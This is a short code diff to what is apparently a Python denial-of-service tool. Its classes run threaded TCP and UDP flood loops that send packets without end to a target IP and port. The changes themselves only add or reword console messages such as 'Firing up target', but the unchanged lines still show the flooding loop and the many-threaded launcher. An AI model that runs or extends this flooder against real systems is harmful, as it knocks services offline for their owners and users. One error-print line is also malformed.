@@ -32,6 +32,7 @@ class Dos():
     def tcp_flood(self, ip, port, buffer_size):
         """ TCP flood function """
 
+        print(GREEN + "TCP flood loaded » Firing up target [{}]:[{}] with a packet size of [{}]".format(ip, port, buffer_size))
         while True:
             try:
                 data = self.size(buffer_size)
@@ -45,6 +46,7 @@ class Dos():
     def udp_flood(self, ip, port, buffer_size):
         """ UDP flood function """
 
+        print(GREEN + "UDP flood loaded » Firing up target [{}]:[{}] with a packet size of [{}]".format(ip, port, buffer_size))
         while True:
             try:
                 data = self.size(buffer_size)
@@ -128,9 +130,9 @@ class Controller(Dos):
         for nr in range(int(amount)):
             try:
                 thread = Thread(target=self.dos, args=(target_ip, port, buffer_size))
-                print(GREEN + "Starting Thread nr [{}] to target [{}]".format(thread, target_ip) + RESET)
+                print(GREEN + "Starting Thread nr [{}] to target [{}]:[{}]".format(thread, target_ip, port) + RESET)
                 thread.start()
-                print(GREEN + "MODE: [{}] THREAD: [{}] » Sucessfully started and sending packets with size [{}] bytes to target [{}]".format(dos_mode, thread, buffer_size, target_ip) + RESET)
+                print(GREEN + "MODE: [{}] THREAD: [{}] » Sucessfully started and sending packets with size [{}] bytes to target [{}]:[{}]".format(dos_mode, thread, buffer_size, target_ip, port) + RESET)
             except Exception as ex:
                 print(RED + "Error in Threading [{}] :", ex, + RESET)
                 sys.exit(0)
